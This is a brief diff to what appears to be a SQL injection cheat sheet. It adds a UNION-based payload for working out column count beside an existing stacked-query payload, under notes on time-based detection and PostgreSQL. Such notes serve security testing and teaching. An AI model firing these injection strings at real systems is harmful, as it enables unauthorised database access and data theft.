@@ -17,6 +17,10 @@ Success if the system takes ~5 seconds to respond.
 
 If query result is visible, figure out column count:
 
+    ') UNION '1', '2', ..., 'n';--
+
+Or alternatively:
+
     '); SELECT 1, 2, ..., n;--
 
 #### PostgreSQL
